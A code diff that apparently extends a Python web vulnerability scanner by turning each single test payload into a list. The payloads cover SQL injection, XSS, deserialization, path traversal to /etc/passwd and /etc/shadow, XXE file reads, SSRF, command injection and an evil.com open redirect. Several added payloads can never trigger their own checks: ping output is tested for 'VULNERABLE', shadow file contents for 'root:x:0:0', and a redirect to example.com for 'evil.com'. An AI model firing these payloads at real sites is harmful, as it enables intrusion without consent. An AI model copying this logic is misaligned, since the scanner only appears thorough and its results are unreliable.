@@ -17,80 +17,99 @@ import re
 
 # Function to test for SQL injection vulnerability
 def test_sql_injection(url):
-    payload = "' OR 1=1--"
-    response = requests.get(url + payload)
-    if re.search(r"error in your SQL syntax|mysql_fetch_array", response.text, re.IGNORECASE):
-        return True
+    payloads = ["' OR 1=1--", "' OR 'a'='a", "' OR 1=1#", "' OR 'a'='a#"]
+    for payload in payloads:
+        response = requests.get(url + payload)
+        if re.search(r"error in your SQL syntax|mysql_fetch_array", response.text, re.IGNORECASE):
+            return True
     return False
 
 # Function to test for XSS vulnerability
 def test_xss(url):
-    payload = "<script>alert('XSS')</script>"
-    response = requests.get(url + payload)
-    if payload in response.text:
-        return True
+    payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
+    for payload in payloads:
+        response = requests.get(url + payload)
+        if payload in response.text:
+            return True
     return False
 
 # Function to test for insecure deserialization vulnerability
 def test_insecure_deserialization(url):
-    payload = "TzoyOToiU3lzdGVtLlRlc3QiOjE6e3M6MToiY29uZmlndXJhdGlvbiI7czoyOiJvYmplY3QiO3M6NDoiYToxOntpOjA7czo2OiJjb2RlIjt9fX0="
-    headers = {"Cookie": "data=" + payload}
-    response = requests.get(url, headers=headers)
-    if "ClassLoader" in response.text:
-        return True
+    payloads = [
+        "TzoyOToiU3lzdGVtLlRlc3QiOjE6e3M6MToiY29uZmlndXJhdGlvbiI7czoyOiJvYmplY3QiO3M6NDoiYToxOntpOjA7czo2OiJjb2RlIjt9fX0=",
+        "TzoyOToiU3lzdGVtLlRlc3QiOjE6e3M6MToiY29uZmlndXJhdGlvbiI7czoyOiJvYmplY3QiO3M6NDoiYToxOntpOjA7czo2OiJjb2RlIjt9fQ=="
+    ]
+    for payload in payloads:
+        headers = {"Cookie": "data=" + payload}
+        response = requests.get(url, headers=headers)
+        if "ClassLoader" in response.text:
+            return True
     return False
 
 # Function to test for directory traversal vulnerability
 def test_directory_traversal(url):
-    payload = "../../../../../../etc/passwd"
-    response = requests.get(url + payload)
-    if "root:x:0:0" in response.text:
-        return True
+    payloads = ["../../../../../../etc/passwd", "../../../../../../etc/shadow"]
+    for payload in payloads:
+        response = requests.get(url + payload)
+        if "root:x:0:0" in response.text:
+            return True
     return False
 
 # Function to test for server-side request forgery (SSRF) vulnerability
 def test_ssrf(url):
-    payload = "http://localhost:8080"
-    response = requests.get(url + "?url=" + payload)
-    if "localhost" in response.text:
-        return True
+    payloads = ["http://localhost:8080", "http://127.0.0.1:8080"]
+    for payload in payloads:
+        response = requests.get(url + "?url=" + payload)
+        if "localhost" in response.text:
+            return True
     return False
 
 # Function to test for remote code execution (RCE) vulnerability
 def test_rce(url):
-    payload = "echo%20VULNERABLE"
-    response = requests.get(url + "?cmd=" + payload)
-    if "VULNERABLE" in response.text:
-        return True
+    payloads = ["echo%20VULNERABLE", "ping%20-c%203%20127.0.0.1"]
+    for payload in payloads:
+        response = requests.get(url + "?cmd=" + payload)
+        if "VULNERABLE" in response.text:
+            return True
     return False
 
 # Function to test for XML external entity (XXE) vulnerability
 def test_xxe(url):
-    payload = """<?xml version="1.0" encoding="UTF-8"?>
-                <!DOCTYPE foo [
-                    <!ENTITY xxe SYSTEM "file:///etc/passwd">
-                ]>
-                <foo>&xxe;</foo>"""
-    headers = {'Content-Type': 'application/xml'}
-    response = requests.post(url, data=payload, headers=headers)
-    if "root:x:0:0" in response.text:
-        return True
+    payloads = [
+        """<?xml version="1.0" encoding="UTF-8"?>
+           <!DOCTYPE foo [
+               <!ENTITY xxe SYSTEM "file:///etc/passwd">
+           ]>
+           <foo>&xxe;</foo>""",
+        """<?xml version="1.0" encoding="UTF-8"?>
+           <!DOCTYPE foo [
+               <!ENTITY xxe SYSTEM "file:///etc/shadow">
+           ]>
+           <foo>&xxe;</foo>"""
+    ]
+    for payload in payloads:
+        headers = {'Content-Type': 'application/xml'}
+        response = requests.post(url, data=payload, headers=headers)
+        if "root:x:0:0" in response.text:
+            return True
     return False
 
 # Function to test for command injection vulnerability
 def test_command_injection(url):
-    payload = "127.0.0.1; echo VULNERABLE"
-    response = requests.get(url + "?ip=" + payload)
-    if "VULNERABLE" in response.text:
-        return True
+    payloads = ["127.0.0.1; echo VULNERABLE", "127.0.0.1; ping -c 3 127.0.0.1"]
+    for payload in payloads:
+        response = requests.get(url + "?ip=" + payload)
+        if "VULNERABLE" in response.text:
+            return True
     return False
 
 # Function to test for open redirect vulnerability
 def test_open_redirect(url):
-    payload = "http://evil.com"
-    response = requests.get(url + "?redirect=" + payload)
-    if "evil.com" in response.url:
-        return True
+    payloads = ["http://evil.com", "http://example.com/evil"]
+    for payload in payloads:
+        response = requests.get(url + "?redirect=" + payload)
+        if "evil.com" in response.url:
+            return True
     return False
 
 # Main function to test all vulnerabilities
